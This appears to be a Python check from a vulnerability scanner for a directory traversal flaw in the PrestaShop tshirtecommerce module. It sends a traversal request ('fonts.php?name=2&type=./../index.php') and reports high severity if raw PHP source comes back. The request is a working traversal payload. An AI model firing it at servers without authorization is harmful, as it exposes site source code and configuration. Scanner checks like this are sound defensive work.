...
class Module(Scanner, Http_client):
    ...
    def run(self):
        r = self.http_request(method="GET", path='/tshirtecommerce/fonts.php?name=2&type=./../index.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('PrestaShop', '<?php',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="PrestaShop tshirtecommerce - Directory Traversal detected",
                path='/tshirtecommerce/fonts.php?name=2&type=./../index.php',
            )
            return True
        return False
